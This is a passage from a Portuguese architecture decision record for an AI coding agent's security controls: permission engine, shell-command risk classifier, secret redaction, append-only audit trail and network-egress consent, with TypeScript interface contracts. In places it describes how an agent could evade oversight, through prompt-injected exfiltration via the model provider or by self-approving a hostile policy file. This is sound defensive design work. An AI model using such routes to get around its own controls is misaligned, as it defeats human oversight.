backend de Library, uma futura chamada MCP) é negado sem uma entrada de consentimento (FR-6/FR-8). Quando
consentido, o **Egress Event é escrito no audit trail (redigido) ANTES de a chamada de rede prosseguir** —
pré-gravação, não best-effort depois (BR-6 estendido à rede; fecha GAP-F, a ordem que FR-7 não fixava): **sem
evento durável, sem egress.** *Grounding:* **Security Engineering Principles §2.12** ("egress destinations depend
on the deployment, not the product" → consentimento-por-deployment, não proibição); herdado do Gate 3 §4 R5.

**Não-over-claim (residual declarado):** o canal do **provedor de modelo** já consentido é, ele próprio, o maior
canal de exfiltração (uma injeção pode mandar conteúdo de arquivo *para o provedor* dentro de um prompt legítimo).
O nível `Network` **contém destinos novos, não fecha o canal do provedor** (Fase 0 T5/T7, inalterado). O produto
**não afirma** "toda exfiltração é gated".

---

## 9. Packaging — um pacote novo (`@conductor/secrets`), o resto nos pacotes existentes

`packages/policies` (previsto por ADR 0002 §3.3): **rejeitado.** Nenhum dos cinco componentes tem *dois*
consumidores reais fora de `conductor-runtime`/`conductor-config`; um pacote dedicado juntaria classifier +
engine + merge + audit (hoje uma unidade coesa) só para reintroduzir uma fronteira de import sem troca de
implementação real (ADR 0002 §2 item 3; **Architecture Boundaries §2.12** "when not to use ports and adapters").
**Nem "tudo em `conductor-runtime`"** — o loader/schema de `policy.json` é genuinamente I/O+schema, o mesmo
bounded context que `config.json` já ocupa em `conductor-config`.

| Componente | Onde mora |
|---|---|
| Command Classifier | `conductor-runtime/src/command-classifier.ts` (novo arquivo, pacote existente) |
| Permission Engine (PDP) | `conductor-runtime/src/permission-engine.ts` (novo) |
| Permission Gate (PEP, fino) | `permission-gate.ts` (existente) |
| Policy loader/schema | `conductor-config/src/{policy-schema,policy-loader}.ts` (novos) |
| Policy merge/trust | `conductor-runtime/src/policy-engine.ts` (novo) |
| Matchers de segredo | **`@conductor/secrets`** (pacote-folha NOVO, zero deps `@conductor/*`) |
| Redaction wiring (6 sinks) | `conductor-runtime/src/redaction.ts` (novo) |
| Audit trail writer | `conductor-runtime/src/audit-trail.ts` (novo) |

**Grafo resultante (extensão do ADR 0002 §3.1), zero ciclos, zero edge novo entre config e runtime:**

```
        @conductor/secrets   (zero deps @conductor/*)
            ^            ^
            |            |
   conductor-config   conductor-runtime   (continuam SEM depender um do outro — invariante 0002 preservado)
            ^            ^
            |            |
            +-- conductor-cli --+-- conductor-project (inalterado)
```

---

## 10. SLIs / SLOs por componente (objetivo explícito do Gate 4)

**Cobertura de biblioteca honesta:** o corpus responde ao *framing* de SLO (cenário "p99 latency < 300ms",
táticas por atributo: segurança = authenticate/authorize/**audit** — **Software Architecture and Quality
Attributes §3.4/§3.5**, top 0.594), mas **não** tem números para **orçamento de latência de gate de permissão de
agente CLI local** (mesma lacuna que a spec NFR-1 já declarou). Os números abaixo são **candidatos de PoC-scale**,
a confirmar/ajustar por medição no Gate 11 — declarados como candidatos, não fechados por citação.

| Componente | SLI | SLO proposto (candidato) | Nota |
|---|---|---|---|
| **Permission Engine + Classifier** (latência de decisão) | overhead **local** p95/p99 por decisão, excluindo espera por aprovação humana | **p95 < 50 ms, p99 < 100 ms** | Alcançável: PDP + classifier são **puros, síncronos, in-process**. Não pode travar o loop do agente perceptivelmente (NFR-1). |
| **Classifier** (falso-positivo) | fração de comandos rotineiros legítimos (corpus de known-good de agente) classificados **≥ high** | **sensitivity point** — alvo: o allowlist cobre o conjunto rotineiro comum → landam low/medium | **A tensão central desta fase.** Restritivo demais → usuário liga `--yes` em tudo → segurança pior (SE Principles §2.2). Sem número de biblioteca; medir contra corpus no Gate 11 e afinar o allowlist. |
| **Audit trail** (disponibilidade de escrita) | fração de decisões com entrada durável gravada **antes** de a operação auditada prosseguir | **100% — error budget 0** | Não é "uptime": é o invariante FR-18. Disco cheio (edge #12) → operação **negada**, não silenciosamente permitida. Mesma postura "error-budget 0 para write-escapes" do ADR 0001 R2. |
| **Redaction** (completude) | fração de spans secret-shaped mascarados antes de alcançar qualquer sink | **100% para known-prefix**; entropia = best-effort | Residual: falso-negativo = formato de segredo novo/não modelado; falso-positivo = SHA/UUID (mitigado por charset/entropia, FR-15). |
| **Network** (consentimento) | fração de egress não-provedor com Egress Event durável **pré-gravado** | **100% — pré-gravação obrigatória** (R5) | Sem evento durável, sem egress (BR-6). |

*Grounding:* **Software Architecture and Quality Attributes §3.4** ("tactics catalogued per attribute:
security = authenticate, authorize, **audit**; a **sensitivity point** is a decision that strongly affects an
attribute") — o falso-positivo do classifier é o *sensitivity point* desta fase, nomeado como tal.

---

## 11. Consequências

### 11.1 Positivas
- O achado T23 (o mais forte da fase) é fechado por um controle real (classifier + extração de alvo chamando a
  autoridade de path única), não por uma afirmação falsa de hard-block.
- `--yes` alcançar protected-path fica **estruturalmente impossível** (contradição de tipo), não "não deveria" —
  o vetor #2 do usuário fechado por construção.
- Um único pacote novo (`@conductor/secrets`); a redação nunca diverge do Secret Scanner (mesma função).
- PDP/PEP split torna a matriz de decisão testável sem `ctx` — o Gate 5 escreve testes de unidade sobre `decide()`
  e `classifyCommand()` puros.

### 11.2 Riscos aceitos (com mitigação)
| # | Risco | Sev. | Mitigação |
|---|---|---|---|
| R1 | **Sem-sandbox:** bash alcança qualquer path que o processo alcança; a garantia de protected-path para bash é grau-classificação, não grau-sandbox | Alto | Declarado por escrito (R7, §1.2/§3.3); classifier fail-closed (alvo opaco → critical); residual honesto, não escondido |
| R2 | Canal do provedor de modelo continua exfil não-gated | Alto | Declarado (§8); fora de escopo (Fase 0 T5/T7); Network contém destinos *novos* |
| R3 | Audit trail sem cripto-integridade (editável por acesso direto ao disco) | Médio | Append-only + protected + 0600 + gitignored; cripto = Fase 4 (declarado) |
| R4 | Classifier restritivo demais → fricção → `--yes` em tudo | Médio | Sensitivity point medido no Gate 11 (§10); allowlist afinável via `policy.json` (grant, trust-on-first-use) |
| R5 | `@conductor/secrets` como pacote pode ser fino demais / nome diverge do `packages/core` genérico previsto em 0002 §3.3 | Baixo | Nome por responsabilidade (convenção `conductor-<resp>`), não gaveta "core"; um segundo consumidor real já existe |
| R6 | Atomicidade de `O_APPEND` no Windows não garantida | Médio | Teste explícito no Gate 6/8 antes de reivindicar NFR-2 nesse SO (residual nomeado) |
| R7 | TOCTOU de symlink (edge #5) — janela entre checagem e execução | Médio | Herdado, sem mitigação nova nesta fase (exigiria abrir-por-fd/re-checar ou sandbox); declarado (Gate 3 §8) |

### 11.3 Negativas / custos assumidos
- 5 arquivos novos + 1 pacote novo + refactor do `permission-gate.ts` (que fica mais fino, mas muda). Aceito: é o
  tamanho real da fase de segurança; nada é criado especulativamente.
- O `PolicyTrustStore` e a costura de redação no write-path são **fronteiras novas** que voltam ao Gate 3 (§13) —
  custo de processo, não de código.

---

## 12. Alternativas consideradas e rejeitadas

- **(A) Parse-AST de shell como mecanismo primário do classifier** — rejeitada (§3.1): diferencial de parser
  contra o sink real; não resolve o decode; custo de supply-chain. Admitida só como corroborador raise-only.
- **(C) Allowlist puro** — rejeitada como suficiente sozinha (§3.1): grosseiro demais, vira fricção → `--yes`.
- **`packages/policies` dedicado** (previsto por ADR 0002 §3.3) — rejeitada (§9): sem segundo consumidor real,
  reintroduz fronteira de import sem troca de implementação.
- **Um único hook de auditoria (reusar `onDecision`)** — rejeitada (§7): best-effort é incompatível com FR-18;
  dois hooks paralelos.
- **Redigir só no render/export** — rejeitada (§6.3): viola R6/GAP-E; redigir-antes-de-persistir é vinculante.
- **`ConductorSessionStore` completo agora para redigir o session JSONL** — rejeitada (§6.3): o store de
  evidência é Fase 4 (ADR 0002 §6); usa-se um transform de redação fino, não o store.

---

## 13. Reconciliação com o Gate 3 addendum Fase 2 (protocolo iterativo)

### 13.1 R1–R10 — como cada uma fica satisfeita

| Regra | Como esta arquitetura a satisfaz |
|---|---|
| **R1** (classificação fail-closed + piso na indireção) | §3.1/§3.2 — `tier=max`, indireção→piso high, decode→interpretador, incerteza→critical, ofuscação raise-only; `classifyCommand` é **total** (fail-closed dentro, retorna critical) |
| **R2** (exibição conservadora) | §4 — `displayCommand` (comando cru terminal-sanitizado) sempre exibido inteiro; badge aditivo; classify-what-you-show |
| **R3** (policy.json split-trust) | §5.2 — restrições incondicionais/unidas; grants por trust-on-first-use (`contentHash`) + tetos (≤ medium) |
| **R4** (merge assimétrico) | §5.2 — `restrições = união`; `grants = interseção trust-ordered`; `denyAllPrivileged` se qualquer fonte invalid |
| **R5** (rede default-deny + evento pré-gravado + residual provedor) | §8 — só provedor pré-consentido; Egress Event redigido pré-gravado; não-over-claim do canal do provedor |
| **R6** (sinks fechados + redigir-antes-de-persistir) | §6 — 6 sinks localizados; `@conductor/secrets` único detector; redação no limite externo; write-path transform p/ session JSONL |
| **R7** (não over-claim + containment do bash pelo classifier) | §1.2/§3.3 — frase escopada por escrito ("grau-classificação, não grau-sandbox"); bash→protected-path = critical |
| **R8** (`--yes` elegibilidade fail-closed) | §4 — 6 prongs, `provablyContained` default false, impossibilidade estrutural |
| **R9** (audit protegido+append-only+fail-closed-write+redigido+local) | §7 — todos; cripto = Fase 4 (residual) |
| **R10** (resolução de nível fail-closed preservada) | §2 — `resolvePermissionLevel`→security por omissão; default-deny terminal sobrevive como último branch |

### 13.2 GAP-A…F — resolução estrutural

- **GAP-A** (FR-5 não cobre encoding) → §3.2 sinais 4/5/6: indireção-para-interpretador pisa em high **independente
  do verbo**; encoding só sobe.
- **GAP-B** (grants de policy.json não modelados) → §5.2: split-trust + tetos + interseção trust-ordered.
- **GAP-C** (enumeração de sinks incompleta) → §6.2: os 6 sinks nomeados e localizados (inclui session JSONL,
  notify/reason, erro re-lançado).
- **GAP-D** (protected-path ilusório p/ bash) → §3.3: extração de alvo chamando `evaluateToolPath`; claim
  rebaixado por escrito (R7).
- **GAP-E** (redigir-antes-de-persistir) → §6.3: fixado como direção vinculante; write-path transform.
- **GAP-F** (ordem do Egress Event) → §8: pré-gravação fixada.

### 13.3 Fronteiras de confiança NOVAS que esta arquitetura expõe — reportadas de volta ao Gate 3

O protocolo (Gate 3 §8) exige: "se o Gate 4 expuser uma fronteira nova, voltar a este Gate 3 antes de avançar."
Duas fronteiras novas, ambas já com tratamento proposto, a **confirmar** no Gate 3 antes do Gate 5:

1. **`PolicyTrustStore`** (§5.3) — o ledger de trust-on-first-use é um **novo store sensível** (T26-like): se
   gravável por ferramenta, um agente "aprova" a própria política hostil. Tratamento: protected-path + 0600 +
   gitignored + escrita só fora-de-banda. **Requer o Gate 3 confirmar** que isto fecha o vetor (é o T18 por outra
   porta).
2. **Costura de redação no write-path do session JSONL** (§6.3) — um novo transform entre o conteúdo de sessão e
   a persistência do Pi. Não expõe superfície de ataque nova (só remove segredo antes de um sink existente), mas
   **toca um componente do Pi** que o Conductor não possui — o Gate 3 deve confirmar que o ponto de integração
   (Gate 6) não abre uma travessia não modelada.

### 13.4 Costuras de integração que o Gate 5/6 DEVE travar (do security-engineer)
- **#1** `ClassificationContext.policy` DEVE ser a política **efetiva já resolvida** (trust + tetos aplicados
  upstream) — o classifier **consome**, não mescla, senão R3/R4 caem no boundary do classifier.
- **#2** output do classifier (`TierSignal.detail`, `displayCommand`) é **fonte nova** para sinks — passa pela
  redação (R6), não é "interno logo isento".
- **#3** claim escopado (R7) — o texto do produto/prompt não pode dizer "bash não alcança protected-path".
- **#4** a classificação entra como **refinamento do branch Exec**, depois de a tool ser conhecida como `bash`;
  o default-deny terminal (FR-22) continua o último branch (R10/T27).

---

## 14. Grounding (biblioteca) — consultas desta sessão

Rodadas de `C:\development\source\projects\conductor` via `cdt library "<pergunta>" --gate 4` (backend saudável,
2267 chunks; o roteamento `--gate 4` escopa a `03_design_and_architecture`). As consultas de *segurança
semântica* (R1–R10) foram esgotadas no Gate 3 addendum e são herdadas por cross-ref, não re-rodadas.

1. **PDP/PEP / onde a decisão mora vs. onde é aplicada** → **Architecture Boundaries and the Dependency Rule
   §2.3/§3.3/§3.4/§1.5/§1.12** ("ports testam o core isolado"; "policy no meio, I/O nas bordas") — top **0.592–
   0.620** (via subagentes). Base do split PDP/PEP (§2) e do grafo de pacotes (§9).
2. **Classificação conservadora de comando de shell** → cobertura **fraca/fora do alvo** (top 0.584, retornou
   Writing Maintainable Code) — **confirma o Gate 3 §8**: sem capítulo dedicado. Ancorado por **Penetration
   Testing §8.4/§8.12** (source→sink; "payload probing é o método errado") + **Web Application Security §1.9**
   (input é dado, allowlist) + **Security Engineering Principles §2.2/§2.9** (fail-closed) — herdados do Gate 3,
   não forçados.
3. **Audit log append-only / fail-closed-write** → **Managing Software Complexity §3.12** ("some callers act
   differently on the error… defining that away deletes information" — top 0.558, **âncora direta** do
   fail-closed-write); **Documenting Software Architecture §3.12 / Practice of Architecting §2.12** ("um formato
   de log é desfeito numa tarde" — sustenta usar JSONL simples e **não** super-projetar cripto agora). ASVS
   V7.1/V7.2 + Secure & Reliable §3.13 herdados do Gate 3. Atomicidade `O_APPEND`: **não coberta** — declarada.
4. **Merge de política (união vs interseção)** → **Distributed Architecture Decisions §1.1/§1.5** ("trade-offs,
   not best practices" — top 0.572), o *framing de trade-off* do §5.2; a *semântica* (restrições unem/grants
   intersectam) herda **Secure & Reliable §3.3/§3.12** do Gate 3.
5. **SLI/SLO** → **Software Architecture and Quality Attributes §3.4/§3.5** (cenário "p99 < 300ms"; táticas por
   atributo: segurança = authorize/**audit**; *sensitivity point*) — top **0.594**. Base do §10; números de gate
   de agente local **não** cobertos (declarado, como a spec NFR-1 já fez).

**Nota consolidada:** o corpus (escopo Gate 4) cobre **forte** fronteiras/dependência/atributos-de-qualidade
(0.55–0.62) e **fraco** design de ferramenta CLI e classificação de comando de shell — reportado explicitamente
em cada eixo, mesma disciplina do ADR 0002 §11 e do Gate 3 §8.

---

## 15. Follow-ups
- **Gate 3 (§13.3):** confirmar as duas fronteiras novas (`PolicyTrustStore`, write-path redaction seam) antes do
  Gate 5.
- **Gate 5 (test-first):** derivar testes de unidade sobre `classifyCommand`/`decide`/`mergePolicies`/`isYesEligible`
  puros; o walkthrough T17 e a impossibilidade estrutural de `--yes`→protected-path viram testes explícitos.
- **Gate 6:** mecanismo de persistência do `PolicyTrustStore`; ponto de integração da redação no write-path do Pi;
  sintaxe exata do `pattern` da allowlist (literal vs glob restrito).
- **Gate 6/8:** teste explícito de atomicidade de `O_APPEND` no **Windows** antes de reivindicar NFR-2.
- **Gate 11:** medir latência de decisão (SLO §10) e falso-positivo do classifier (o sensitivity point) contra um
  corpus de comandos known-good; afinar o allowlist.
- **Fase 4:** cripto-integridade do audit trail (hash-chain/assinatura) + `ConductorSessionStore` completo.

---

## 16. Apêndice — contratos TypeScript (para o Gate 5/6 não reinventar a interface)

> Ilustrativos de contrato, não código de produção pronto para commit. Derivados dos subagentes
> `security-engineer` (classifier, `--yes`) e `backend-engineer` (packaging, policy, audit, redaction).

```typescript
// ---- @conductor/secrets (pacote-folha novo, zero deps @conductor/*) ----
export interface SecretSpan { start: number; end: number; kind: "known-prefix" | "high-entropy"; label: string; }
export function findSecretSpans(text: string, options?: SecretMatchOptions): SecretSpan[];
export function redactSecrets(text: string, options?: RedactOptions): string; // mascara; placeholder fixo, não-reversível (BR-7)
export function looksSecretShaped(value: string, options?: SecretMatchOptions): boolean;
export function matchesKnownSecretPrefix(value: string, options?: SecretMatchOptions): boolean;
export function looksHighEntropy(value: string): boolean;
export function isSensitiveFieldName(fieldName: string): boolean;
export function looksLikeEnvVarReference(value: string): boolean;

// ---- conductor-runtime/src/command-classifier.ts ----
export type RiskTier = "low" | "medium" | "high" | "critical";
export interface ExtractedTarget {
  raw: string;
  via: ">" | ">>" | "rm" | "mv" | "truncate" | "dd" | "tee" | "install" | "cp" | "read";
  staticallyResolvable: boolean;
  containment?: PathCheckResult;            // o tipo que workspace-policy.ts JÁ retorna
}
export interface TierSignal { kind: string; tier: RiskTier; detail: string; target?: ExtractedTarget; }
export interface ClassificationContext { workspace: WorkspacePolicyOptions; policy: EffectiveCommandPolicy; }
export interface ClassificationResult {
  tier: RiskTier;                            // = max sobre signals; nunca abaixo da maior subida
  signals: TierSignal[];
  provablyContained: boolean;                // default false; só prova positiva liga (gate do --yes, R8)
  hasUnanalyzableSpan: boolean;
  displayCommand: string;                    // bytes exibidos = bytes classificados (R2)
}
/** Puro, síncrono, TOTAL: nunca lança — falha interna vira tier:"critical" (BR-1/BR-9/FR-4). */
export function classifyCommand(command: string, ctx: ClassificationContext): ClassificationResult;

// ---- conductor-runtime/src/permission-engine.ts (PDP puro) ----
export type PermissionLevel = "read" | "write" | "exec" | "network" | "security";
export type EngineOutcome =
  | { kind: "allow"; approvalMethod: "none" | "allowlist" | "yes-flag" }
  | { kind: "deny"; reason: string }
  | { kind: "needs-approval"; title: string; message: string };
export function resolvePermissionLevel(toolName: string): PermissionLevel;  // desconhecido → "security" (R10/FR-22)
export function decide(toolName: string, input: unknown, options: PermissionEngineOptions):
  { outcome: EngineOutcome; permissionLevel: PermissionLevel; riskTier?: RiskTier };
export function isYesEligible(result: ClassificationResult, baseDecision: PolicyDecision,
  level: PermissionLevel, networkConsented: boolean): boolean;
// isYesEligible ⟺ baseDecision.block===false && level!=="security"
//   && !(level==="network" && !networkConsented) && (tier==="low"||tier==="medium")
//   && result.provablyContained===true && result.hasUnanalyzableSpan===false

// ---- conductor-config/src/policy-schema.ts (borda de I/O) ----
export interface PolicyDocument {
  schema: 1;
  protectedPaths?: string[];                                       // restrição (R3, sempre unida)
  allowlist?: { pattern: string; risk: "low" | "medium" }[];        // grant (teto ≤ medium, BR-8)
  network?: { destination: string }[];                              // grant de rede (FR-6/7/BR-10)
}
export type PolicyLoadResult =
  | { status: "absent" }                                            // FR-24
  | { status: "invalid"; reason: string }                           // FR-23 (JSON OU schema)
  | { status: "loaded"; policy: PolicyDocument; contentHash: string }; // sha256, chave do trust-on-first-use
export function loadPolicyDocument(filePath: string): PolicyLoadResult;  // nunca lança

// ---- conductor-runtime/src/policy-engine.ts (merge/trust) ----
export interface EffectivePolicy {
  protectedPaths: string[];                                         // union(defaults, fontes) — BR-5
  allowlist: { pattern: string; risk: "low" | "medium" }[];          // interseção trust-ordered (R4)
  network: { destination: string }[];
  denyAllPrivileged: boolean;                                       // FR-23: qualquer fonte invalid liga
}
export interface PolicyTrustStore { isTrusted(kind: "project" | "user-global", contentHash: string): boolean; }
export function mergePolicies(builtinDefaults: { protectedPaths: string[] },
  sources: TrustedPolicySource[], trustStore: PolicyTrustStore): EffectivePolicy;

// ---- conductor-runtime/src/audit-trail.ts ----
export type ApprovalMethod = "human" | "yes-flag" | "allowlist" | "none";
export interface AuditEntry {
  timestamp: string; toolName: string; toolCallId: string;
  permissionLevel: PermissionLevel; riskTier?: RiskTier;
  decision: "allow" | "deny"; reason?: string;                     // já redigido antes de serializar
  yesFlagActive: boolean; approvalMethod: ApprovalMethod;          // FR-21/BR-11
  egress?: { destination: string };                                // só Network (FR-7)
}
export interface AuditTrailWriter { appendAuditEntry(entry: AuditEntry): void; } // síncrono, lança → fail-closed
export function createAuditTrailWriter(filePath: string): AuditTrailWriter;      // O_APPEND, 0o600

// ---- conductor-runtime/src/redaction.ts (choke dos 6 sinks) ----
export function redactSecrets(text: string, options?: RedactOptions): string;   // wrapper fail-closed sobre @conductor/secrets
```
